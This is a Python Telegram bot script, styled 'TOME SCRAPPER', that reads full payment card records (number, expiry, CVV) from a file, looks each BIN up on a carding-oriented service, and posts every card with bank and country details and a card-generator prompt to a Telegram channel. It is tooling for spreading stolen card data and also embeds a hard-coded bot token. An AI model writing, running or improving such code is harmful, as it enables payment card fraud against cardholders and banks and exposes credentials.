import telebot
import random
import requests
import threading
import time

TOKEN = "7400413032:AAFSoOedsDYDvIiZx01faRe6Yi0pLuJi6I0"
send_cc = -1002199889084
random_image = "https://pic.re/image"

stickers = [
    '✨', '🔥', '🎉', '👑', '⚡️', '🌊', '🌨', '🌩', '🌟', '🪐', 
    '💫', '🌚', '🌝', '🌻', '🥀', '🍁', '🍄', '💵', '💸'
]

bot = telebot.TeleBot(TOKEN)

def get_bin_info(bin_number):
    api_url = f"https://bins.antipublic.cc/bins/{bin_number}"
    try:
        response = requests.get(api_url)
        if response.status_code == 200:
            return response.json()
        else:
            return None
    except Exception as e:
        print(f"Error fetching bin info: {e}")
        return None

def format_bin_info(bin_data, full_cc):
    cc_parts = full_cc.split("|")
    cc_number = cc_parts[0]
    cc_month = cc_parts[1] if len(cc_parts) > 1 else ""
    cc_year = cc_parts[2] if len(cc_parts) > 2 else ""
    cc_cvv = cc_parts[3] if len(cc_parts) > 3 else ""
    sticker = random.choice(stickers)

    formatted_info = f"""
    <b>〄 TOME SCRAPPER ｢ {sticker} 」 
⸻⸻⸻⸻⸻⸻⸻⸻
〄 ┌ Card ➝ <code> {full_cc}</code>
〄 └ Extra ➝ <code>/gen {cc_number[:12]}xxxx|{cc_month}|{cc_year}|xxx</code>
⸻⸻⸻⸻⸻⸻⸻⸻
〄 ┌ Bin ➝ {bin_data.get('bin', '')[:6]} | {bin_data.get('country_flag', '')}
〄 ├ Info ➝ {bin_data.get('type', '')} - {bin_data.get('brand', '')}
〄 ├ Bank ➝ {bin_data.get('bank', '')}
〄 └ Country ➝  {bin_data.get('country_name', '')} | {bin_data.get('country_flag', '')}
⸻⸻⸻⸻⸻⸻⸻⸻
〄 ┌ T ➝ {time.strftime("%a %b | %d | %Y | %H:%M:%S")} ｢🇮🇶」
〄 └ Dev ➝ <a href="https://t.me/FJ0FF"> تــومـــ🇮🇶ـــي </a>
</b>
    """
    return formatted_info

def get_random_image():
    response = requests.get(random_image)
    return response.content

def send_file_lines_to_channel(cc_file):
    with open(cc_file, "r") as file:
        for line in file:
            full_cc = line.strip()
            bin_info = get_bin_info(full_cc[:6])
        
            if bin_info:
                formatted_info = format_bin_info(bin_info, full_cc)
                image_data = get_random_image()
               
                bot.send_photo(send_cc, image_data, caption=formatted_info, parse_mode="html")
                time.sleep(10)
                print(full_cc)
            else:
                print(f"Error fetching bin info for {full_cc}")

def recibir_msg():
    bot.infinity_polling()

if __name__ == "__main__":
    send_file_lines_to_channel("anime_cc.txt")
    recibir_msg()
